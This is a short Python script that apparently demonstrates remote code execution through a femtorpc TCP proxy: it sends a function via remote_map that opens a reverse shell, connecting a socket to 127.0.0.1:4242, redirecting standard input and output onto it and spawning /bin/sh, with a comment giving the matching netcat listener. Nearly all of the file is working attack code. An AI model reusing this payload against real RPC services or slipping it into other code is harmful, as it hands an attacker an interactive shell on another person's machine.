from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        def reverse_shell(x):
            import socket
            import os
            import pty
            import multiprocessing
            
            def process():
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("127.0.0.1",4242))
                os.dup2(s.fileno(),0)
                os.dup2(s.fileno(),1)
                os.dup2(s.fileno(),2)
                
                pty.spawn("/bin/sh")
            
            p = multiprocessing.Process(target=process)
            p.start()

        # nc -lvp 4242
        proxy.remote_map(reverse_shell, [1]) 